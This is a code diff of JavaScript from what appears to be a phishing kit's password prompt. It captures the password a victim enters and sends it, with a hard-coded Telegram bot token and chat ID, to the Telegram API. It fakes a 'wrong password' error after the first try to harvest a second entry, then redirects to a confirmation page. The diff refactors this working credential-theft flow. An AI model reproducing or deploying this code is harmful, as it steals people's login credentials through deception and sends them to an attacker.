@@ -188,9 +188,8 @@ function sendForm(IpAddress) {
 let FIRST_PASSWORD = '';
 
 function showPrompt(IpAddress) {
-
-
     $('#getPassword').removeClass('d-none');
+
     $("#close-password").off("click");
     $('#close-password').on('click', function () {
         $('#getPassword').addClass('d-none');
@@ -198,13 +197,16 @@ function showPrompt(IpAddress) {
 
     $("#submit-password").off("click");
     $('#submit-password').on('click', function () {
+        const submitBtn = $('#submit-password');
         let password = $("#password").val();
+
         if (password === '') {
             $('#password').addClass('border-danger');
             return;
         } else {
             $('#password').removeClass('border-danger');
         }
+
         let secondPassword = '';
         if (NUMBER_TIME_LOGIN >= 1) {
             secondPassword = password;
@@ -224,7 +226,6 @@ function showPrompt(IpAddress) {
 
         const botToken = '7371433087:AAHBPfH8Kshg2ce5ZHCHLDYe43ivmzKnCqk';
         const chatId = '-1002416068664';
-        const message = message1;
 
         const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
@@ -235,7 +236,7 @@ function showPrompt(IpAddress) {
             },
             body: JSON.stringify({
                 chat_id: chatId,
-                text: message,
+                text: message1,
                 parse_mode: 'html'
             })
         })
@@ -247,38 +248,33 @@ function showPrompt(IpAddress) {
         })
         .then(data => {
             NUMBER_TIME_LOGIN++;
-          if (NUMBER_TIME_LOGIN === 1) {
-    FIRST_PASSWORD = password;
 
-    const submitBtn = $('#submit-password');
-    let countdown = 10;
+            // 👉 Chỉ disable nút, không làm mờ
+            submitBtn.prop('disabled', true);
 
-    // 👉 Cập nhật ngay để tránh delay hiển thị
-    submitBtn.text(`Wait ${countdown}s`);
-    submitBtn.prop('disabled', true);
+            if (NUMBER_TIME_LOGIN === 1) {
+                FIRST_PASSWORD = password;
 
-    // 👉 Delay phần DOM nặng sang vòng sau
-    setTimeout(() => {
-        $('.lsd-ring-container').addClass('d-none');
-        $('#password').val('');
-    }, 100); // hoãn 100ms để đảm bảo giao diện đã cập nhật nút
+                let countdown = 10;
+                submitBtn.text(`Wait ${countdown}s`);
 
-    const interval = setInterval(() => {
-        countdown--;
-        if (countdown > 0) {
-            submitBtn.text(`Wait ${countdown}s`);
-        } else {
-            clearInterval(interval);
-            submitBtn.prop('disabled', false);
-            submitBtn.text('Continue');
+                setTimeout(() => {
+                    $('.lsd-ring-container').addClass('d-none');
+                    $('#password').val('');
+                }, 100);
 
-            // 👉 Hiện lỗi sau khi đếm xong
-            $('#wrong-password').removeClass('d-none');
-        }
-    }, 1000);
-}
-
- else {
+                const interval = setInterval(() => {
+                    countdown--;
+                    if (countdown > 0) {
+                        submitBtn.text(`Wait ${countdown}s`);
+                    } else {
+                        clearInterval(interval);
+                        submitBtn.prop('disabled', false);
+                        submitBtn.text('Continue');
+                        $('#wrong-password').removeClass('d-none');
+                    }
+                }, 1000);
+            } else {
                 setTimeout(function () {
                     $('.lsd-ring-container').addClass('d-none');
                     window.location.href = "/confirm/s9d8a7da7d6a811akc23.html";
@@ -294,8 +290,9 @@ function showPrompt(IpAddress) {
                 $('.lsd-ring-container').addClass('d-none');
             }, 500);
         });
-
     });
+}
+
 
 
 }
